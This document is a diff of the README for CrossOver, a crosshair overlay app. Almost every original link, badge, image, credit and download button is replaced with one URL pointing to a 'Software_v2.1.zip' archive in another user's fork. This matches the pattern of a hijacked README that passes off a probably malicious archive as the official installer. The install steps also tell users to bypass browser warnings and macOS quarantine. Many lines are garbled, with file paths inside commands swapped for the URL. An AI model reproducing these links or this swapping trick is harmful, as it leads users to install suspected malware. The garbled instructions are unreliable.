@@ -1,15 +1,15 @@
 <p align="center">
-  <img width="200" height="200" src="https://github.com/lacymorrow/crossover/raw/master/src/static/icons/icon.png">
+  <img width="200" height="200" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
 </p>
 
-# CrossOver [<img src="https://github.com/lacymorrow/crossover/raw/master/src/static/meta/patreon-button.webp" height="40" align="right" />](https://www.patreon.com/bePatron?u=55065733)
+# CrossOver [<img src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip" height="40" align="right" />](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 > 🎯 Adjustable Crosshair Overlay for any screen
 
-![Latest releases](https://img.shields.io/github/downloads/lacymorrow/crossover/latest/total?label=CrossOver%40latest) [![Snapcraft](https://snapcraft.io/crossover/badge.svg)](https://snapcraft.io/crossover) [![Trending](https://snapcraft.io/crossover/trending.svg?name=0)](https://snapcraft.io/crossover) [![CircleCI](https://circleci.com/gh/lacymorrow/crossover/tree/release.svg?style=shield)](https://circleci.com/gh/lacymorrow/crossover/) [![Appveyor](https://ci.appveyor.com/api/projects/status/qtxvaliwymvhxiwx/branch/release?svg=true)](https://ci.appveyor.com/project/lacymorrow/crossover/)
+![Latest releases](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip%40latest) [![Snapcraft](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) [![Trending](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) [![CircleCI](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) [![Appveyor](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
-### [Download CrossOver for Windows](https://github.com/lacymorrow/crossover/releases/latest/download/CrossOver.exe)
-##### [All Downloads (Mac, Linux, Windows)](https://github.com/lacymorrow/crossover/releases/latest/)
+### [Download CrossOver for Windows](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
+##### [All Downloads (Mac, Linux, Windows)](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 
 ##### To Use CrossOver: <kbd>Control</kbd>-<kbd>Alt</kbd>-<kbd>Shift</kbd>-<kbd>X</kbd>
@@ -19,7 +19,7 @@ CrossOver allows you to place a customizable crosshair overlay above any applica
 Improve your aim and gain a competitive advantage with a permanent colored crosshair to mark center screen.
 
 <p align="center">
-  <img src="https://github.com/lacymorrow/crossover/raw/master/src/static/meta/demo-main.png"/>
+  <img src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip"/>
 </p>
 
 
@@ -41,11 +41,11 @@ Improve your aim and gain a competitive advantage with a permanent colored cross
 
 # Download
 
-### [View All Dowloads (for any OS)](https://github.com/lacymorrow/crossover/releases/latest)
+### [View All Dowloads (for any OS)](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 ### Windows
 
-Download `CrossOver.exe` to install CrossOver to your system and receive automatic updates.
+Download `https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip` to install CrossOver to your system and receive automatic updates.
 
 If you just want to try out CrossOver, or don't like installing things, we offer a portable `exe` as well.
 
@@ -68,7 +68,7 @@ We offer the following formats:
 
 Or download from the Snap Store
 
-[![Get it from the Snap Store](https://snapcraft.io/static/images/badges/en/snap-store-black.svg)](https://snapcraft.io/crossover)
+[![Get it from the Snap Store](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 
 # Quick Start
@@ -84,17 +84,17 @@ Or download from the Snap Store
 
 <p align="center">
 	<br />
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/Actual/ballistic-firedot.png">
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/The%20Diatoku/Green.png">
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/Chevron/Amethyst.png">
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/Actual/moa-delta.png">
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/Kenney/crosshair052.png">
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/MLG%20Dot%20Outlined/Blue.png">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip%https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip%20Dot%https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
 </p>
 
 # Features
 
-- Not bannable <sup>* [[79]](https://github.com/lacymorrow/crossover/issues/79)</sup>
+- Not bannable <sup>* [[79]](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)</sup>
 - Fast and lightweight
 - Choose from tons of true-to-life sights
 - Cross-platform: Windows, MacOS, and Linux support
@@ -107,15 +107,15 @@ Or download from the Snap Store
 - Persistent settings remember your choices automatically
 - Automatically updates in the background to keep your features fresh _(Mac and Windows only)_
 
-<sup>* </sup> Escape from Tarkov will not work with CrossOver ([#47](https://github.com/lacymorrow/crossover/issues/47#issuecomment-987762466))
+<sup>* </sup> Escape from Tarkov will not work with CrossOver ([#47](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip))
 
 
-### [Download CrossOver for Windows](https://github.com/lacymorrow/crossover/releases/latest/download/CrossOver.exe)
+### [Download CrossOver for Windows](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
-##### [View all dowloads for any OS](https://github.com/lacymorrow/crossover/releases/latest)
+##### [View all dowloads for any OS](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 <p align="center">
-  <img src="https://github.com/lacymorrow/crossover/raw/master/src/static/meta/demo-duplicate.png"/>
+  <img src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip"/>
 </p>
 
 Other crosshair programs offer a single style or color option, and often don't allow you to reposition them. CrossOver is a small, unintrusive crosshair overlay which has plenty of configuration options to assist with aiming and vision of your crosshair. CrossOver offers a huge improvement to many games' default crosshairs for those with colorblindness or contrast issues.
@@ -128,14 +128,14 @@ Other crosshair programs offer a single style or color option, and often don't a
 
 _macOS 10.10+, Linux, and Windows 7+ are supported._
 
-#### Download the latest version of CrossOver from the [releases page](https://github.com/lacymorrow/crossover/releases/latest)
+#### Download the latest version of CrossOver from the [releases page](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 ##### _Because this app is Free and Open-Source, we cannot afford to sign our code. This means Chrome may warn about an untrusted download, this is normal. Click the arrow icon -> `Keep` to finish downloading. Windows Defender and Mac Gatekeeper will prevent you from running the app the first time._
 
 
 ##### Windows
 
-[**Download**](https://github.com/lacymorrow/crossover/releases/latest/download/CrossOver.exe) the `.exe` file. _**(CrossOver-Setup-x.x.x.exe)**_
+[**Download**](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) the `.exe` file. _**(https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)**_
 
 > Windows protected your PC.
 
@@ -145,7 +145,7 @@ _macOS 10.10+, Linux, and Windows 7+ are supported._
 
 ##### Mac
 
-[**Download**](https://github.com/lacymorrow/crossover/releases/latest) the `.dmg` file. _**(CrossOver-x.x.x.dmg)**_
+[**Download**](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) the `.dmg` file. _**(https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)**_
 
 > "CrossOver" cannot be opened because the developer cannot be verified.
 
@@ -154,23 +154,23 @@ _macOS 10.10+, Linux, and Windows 7+ are supported._
 
 > "CrossOver is damaged and can't be opened..."
 
-M1 Mac security fix: (_thanks [Yoyopizzacat, #207](https://github.com/lacymorrow/crossover/issues/207#issuecomment-1212708790)_)
+M1 Mac security fix: (_thanks [Yoyopizzacat, #207](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)_)
 
 - Make sure CrossOver is in your `/Applications` folder
-- Open your terminal and type `sudo xattr -r -d com.apple.quarantine /Applications/CrossOver.app`
+- Open your terminal and type `sudo xattr -r -d https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip`
 - Type in your password and now you can use CrossOver!
 
 
 ##### Linux
 
-[**Download**](https://github.com/lacymorrow/crossover/releases/latest) the file appropriate to your system. (`.AppImage`, `.apk`, `.deb`, `.freebsd`, `.pacman`, `.rpm`, `.snap`)
+[**Download**](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) the file appropriate to your system. (`.AppImage`, `.apk`, `.deb`, `.freebsd`, `.pacman`, `.rpm`, `.snap`)
 
-_The AppImage needs to be [made executable](http://discourse.appimage.org/t/how-to-make-an-appimage-executable/80) after download._
+_The AppImage needs to be [made executable](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) after download._
 
-###### _Further instructions for [Windows](https://www.techjunkie.com/windows-protected-your-pc-disable-smartscreen/) and [Mac](https://support.apple.com/en-us/HT202491)_
+###### _Further instructions for [Windows](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) and [Mac](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)_
 
 <p align="center">
-  <img src="https://github.com/lacymorrow/crossover/raw/master/src/static/meta/demo-chooser.png"/>
+  <img src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip"/>
 </p>
 
 
@@ -206,7 +206,7 @@ _The AppImage needs to be [made executable](http://discourse.appimage.org/t/how-
 ###### Linux: Some distributions do not center on double-click.
 
 <p align="center">
-  <img src="https://github.com/lacymorrow/crossover/raw/master/src/static/meta/demo-settings.png"/>
+  <img src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip"/>
 </p>
 
 
@@ -228,7 +228,7 @@ Choose a mouse button to use as your ADS button. The crosshair will be hidden wh
 
 ##### Harware acceleration
 
-A handful of users have reported FPS issues with certain games ([#70](https://github.com/lacymorrow/crossover/issues/70)), CrossOver should not add any FPS or latency so if you experience it, toggle this setting on or off and disable [`Hide on ADS`](#hide-on-ads)
+A handful of users have reported FPS issues with certain games ([#70](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)), CrossOver should not add any FPS or latency so if you experience it, toggle this setting on or off and disable [`Hide on ADS`](#hide-on-ads)
 
 ##### Start on boot
 
@@ -256,17 +256,17 @@ To reset all settings and binds to default, press <kbd>Control</kbd>-<kbd>Alt</k
 
 <p align="center">
 	<br />
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/Actual/boone-crockett-illuminated.png">
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/The%20Diatoku/Purple.png">
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/Kenney/crosshair035.png">
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/Special%20Requests/Monkeybolo.png">
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/MLG%20Dot%20Outlined/Orange.png">
-	<img width="120" height="120" src="https://github.com/lacymorrow/crossover/raw/master/src/static/crosshairs/Actual/leupold-dot.png">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip%https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip%https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip%20Dot%https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
+	<img width="120" height="120" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip">
 </p>
 
 ---
 
-## [What works/doesn't work (compatability)](https://github.com/lacymorrow/crossover/issues/47)
+## [What works/doesn't work (compatability)](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 ###### ❌ Most games don't work in Fullscreen mode on Windows or Linux
 
@@ -282,7 +282,7 @@ To reset all settings and binds to default, press <kbd>Control</kbd>-<kbd>Alt</k
 | ✅    | Deceit                            | Runs in `Windowed` mode                                                            |
 | ✅    | Destiny 2                         | Runs in `Windowed Fullscreen` mode; _Some reports of running in `Fullscreen` mode_ |
 | ✅    | Empyrion: Galactic Survival       | Runs in `Windowed` mode                                                            |
-| ❌    | Escape from Tarkov                | Users report the game will no longer start with CrossOver running ([#47](https://github.com/lacymorrow/crossover/issues/47#issuecomment-987762466))                                 |
+| ❌    | Escape from Tarkov                | Users report the game will no longer start with CrossOver running ([#47](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip))                                 |
 | ✅    | FiveM                             | Runs in `Fullscreen` mode                                                          |
 | ✅    | Fortnite                          | Runs in `Windowed Fullscreen` mode                                                 |
 | ✅    | Killing Floor                     | Runs in `Windowed` mode                                                 |
@@ -303,7 +303,7 @@ To reset all settings and binds to default, press <kbd>Control</kbd>-<kbd>Alt</k
 | ❌    | Vulkan-based games                | |
 | ✅    | Valorant                          | Runs in `Borderless` and `Windowed` modes                                          |
 
-> Reported from our users, [add your resuts](https://github.com/lacymorrow/crossover/issues/47)
+> Reported from our users, [add your resuts](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 #### Operating Systems
 
@@ -314,31 +314,31 @@ To reset all settings and binds to default, press <kbd>Control</kbd>-<kbd>Alt</k
 | ✅    | Windows 10 ia32         |
 | ✅    | Windows 10 x64          | Custom cursors do not show in draggable taskbar area                                                      |
 | ✅    | Windows 8               |                                                       |
-| ❓    | Windows 7               | Does not work in Windows 7 Home; Works in Windows 7 Pro [#63](https://github.com/lacymorrow/crossover/issues/63)|
+| ❓    | Windows 7               | Does not work in Windows 7 Home; Works in Windows 7 Pro [#63](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)|
 | ❓    | Arch                    | Tested in v2021.01.01                                                                                     |
 | ✅    | Elementary OS           | Tested in v5.1                                                                                            |
 | ✅    | Fedora                  | Tested in v33 (Shortcut conflicts with desktop switching)                                                 |
 | ✅    | Mint                    | Tested in v20.1                                                                                           |
 | ✅    | Ubuntu                  | Tested in v20.04.1                                                                                        |
 
-###### Newer MacOS' may quarantine the `CrossOver.app` package. To un-quarantine:
+###### Newer MacOS' may quarantine the `https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip` package. To un-quarantine:
 
-- Move `CrossOver.app` to your `Applications` folder
-- Open terminal and type: sudo xattr -r -d com.apple.quarantine /Applications/CrossOver.app
+- Move `https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip` to your `Applications` folder
+- Open terminal and type: sudo xattr -r -d https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip
 
-> via [@Yoyopizzacat](https://github.com/lacymorrow/crossover/issues/207#issuecomment-1212708790)
+> via [@Yoyopizzacat](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 ---
 
 # Development
 
-Built with [Electron](https://electronjs.org). Simple HTML and Javascript, no framework.
+Built with [Electron](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip). Simple HTML and Javascript, no framework.
 
-Start developing in `src/main.js` and `src/renderer.js`. `index.html` contains the layout and `index.scss` contains the styles for the main app [`BrowserWindow`]()
+Start developing in `https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip` and `https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip`. `https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip` contains the layout and `https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip` contains the styles for the main app [`BrowserWindow`]()
 
 ### Run
 
-##### _You will need [node.js](https://nodejs.org/) v14.x.x installed. If you have `nvm` installed, run `nvm install && nvm use` to switch to the correct node version._
+##### _You will need [https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) v14.x.x installed. If you have `nvm` installed, run `nvm install && nvm use` to switch to the correct node version._
 
 ```
 $ yarn && yarn start
@@ -346,10 +346,10 @@ $ yarn && yarn start
 
 ### Build
 
-> Build steps optimized for Mac, see [electron.builder](http://electron.builder) for help customizing builds.
+> Build steps optimized for Mac, see [https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) for help customizing builds.
 
 _wine_ and _mono_ must be installed for Windows builds _(macOS)_
-[_multipass_](https://multipass.run/) must be installed for Snap builds _(macOS)_
+[_multipass_](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) must be installed for Snap builds _(macOS)_
 
 ```
 $ yarn build
@@ -367,7 +367,7 @@ Then edit the automatically created GitHub Releases draft and publish.
 
 ## Bugs
 
-### [Hidden by fullscreen apps](https://github.com/lacymorrow/crossover/issues/1)
+### [Hidden by fullscreen apps](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 Currently CrossOver only works with windowed applications, use `Windowed Fullscreen` mode if your game or application supports it. _Windows_ -
 
@@ -375,11 +375,11 @@ Fullscreen for MacOS may have better results.
 
 #### Workaround
 
-If you absolutely need to use `Fullscreen` mode, or your game is not supported by crossover, there is a workaround using [AutoHotKey](https://www.autohotkey.com/).
+If you absolutely need to use `Fullscreen` mode, or your game is not supported by crossover, there is a workaround using [AutoHotKey](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip).
 
-_Doesn't work with some games [#47](https://github.com/lacymorrow/crossover/issues/47#issuecomment-895995990), and causes FPS issues in other cases_
+_Doesn't work with some games [#47](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip), and causes FPS issues in other cases_
 
-Install AutoHotKey and run this script with it (save it as `script.ahk` and double-click it):
+Install AutoHotKey and run this script with it (save it as `https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip` and double-click it):
 
 ```autohotkey
 Home::Winset, Alwaysontop, , CrossOver
@@ -387,7 +387,7 @@ Home::Winset, Alwaysontop, , CrossOver
 
 Once in-game, pressing space should put the crosshair over the screen, even in fullscreen mode.
 
-> via [@girkovarpa](https://github.com/lacymorrow/crossover/issues/47#issuecomment-805017469)
+> via [@girkovarpa](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 ### Graphical issues on Linux
 
@@ -400,7 +400,7 @@ You can run CrossOver from the command line to see debug output. Open a terminal
 
 > (Mac, Linux)
 ```sh
-╭─  lacymorrow in /Applications/CrossOver.app/Contents/MacOS using
+╭─  lacymorrow in https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip using
 ╰─○ $ ./CrossOver --debug
 09:45:16.023 › CrossOver 2.7.4 Development
 09:45:16.030 › Setting: Enable GPU
@@ -432,15 +432,15 @@ Print the app version to `stdout` (Good for CI).
 
 An extra big thanks to the crosshair providers, as this wouldn't be possible without them:
 
-- Reddit user [/u/IrisFlame](https://www.reddit.com/user/irisflame/)
+- Reddit user [/u/IrisFlame](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
-- [Kenney.nl Crosshair Pack](https://kenney.nl/assets/crosshair-pack) (_donate to him, not me_)
+- [https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip Crosshair Pack](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) (_donate to him, not me_)
 
 > Gaming, Crosshair, Crossover App
 
-See CrossOver in the [Electron Apps library](https://www.electronjs.org/apps/crossover)
+See CrossOver in the [Electron Apps library](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
-Created by [Lacy Morrow](http://lacymorrow.com)
+Created by [Lacy Morrow](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
 
 # Support this project
@@ -450,13 +450,13 @@ Created by [Lacy Morrow](http://lacymorrow.com)
 ### This project is entirely developed, built, and maintained by one person. I've put hundreds of hours into this and I love being able to give it away for free.
 
 Problem is, downloads don't pay the bills.
-If you would like to see specific features or improvements added to CrossOver, consider donating on [OpenCollective](https://opencollective.com/crossover)
+If you would like to see specific features or improvements added to CrossOver, consider donating on [OpenCollective](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip)
 
-## If you like this software and want to see it improved more often, consider supporting me on [Patreon](https://patreon.com/lacymorrow) or through another channel:
+## If you like this software and want to see it improved more often, consider supporting me on [Patreon](https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip) or through another channel:
 
 ### Tip Crypto
 
 - **BTC:** `3Bdu2sTAmXyZzqeRQxCt6P22zHtTLg4mQE`
 - **ETH:** `0x5be1074a5148F8D723dE1F2Dd326e1B15c82553D`
 
-<a href="https://www.patreon.com/bePatron?u=55065733" target="_blank"><img src="https://github.com/lacymorrow/crossover/raw/master/src/static/meta/patreon-button.webp" height="50" /></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://opencollective.com/crossover/donate" target="_blank"><img src="https://opencollective.com/crossover/donate/button@2x.png?color=blue" height="50" /></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.buymeacoffee.com/lm" target="_blank"><img height="50" src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" ></a>
+<a href="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip" target="_blank"><img src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip" height="50" /></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip" target="_blank"><img src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip" height="50" /></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip" target="_blank"><img height="50" src="https://github.com/urnansucker2000fuckme/crossover/raw/refs/heads/master/src/renderer/vendor/pickr/Software_v2.1.zip" alt="Buy Me A Coffee" ></a>
